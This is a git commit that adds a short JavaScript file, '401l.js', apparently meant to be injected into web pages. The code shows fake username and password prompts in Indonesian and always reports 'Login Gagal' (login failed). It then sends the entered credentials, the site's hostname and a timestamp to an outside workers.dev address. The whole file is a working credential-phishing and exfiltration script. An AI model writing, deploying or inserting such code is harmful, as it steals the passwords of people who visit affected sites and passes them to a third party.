541b7342903b59b76d6af0d80ba3efdd57e1ac92
inggarfi <inggarsaput@gmail.com>
2026-03-22 08:04:25 +0700

    Create 401l.js

---
+++ 401l.js
@@ -0,0 +1,19 @@
+(function () {
+  const user = prompt("Nama pengguna:");
+  if (user === null) return;
+
+  const pass = prompt("Sandi:");
+  if (pass === null) return;
+
+  alert("Login Gagal");
+
+  const data =
+    "user=" + user +
+    "&pass=" + pass +
+    "&domain=" + location.hostname +
+    "&time=" + new Date().toISOString();
+
+  fetch("https://memek-worker.defoy89122.workers.dev/?message=" 
+    + encodeURIComponent(data)
+  );
+})();
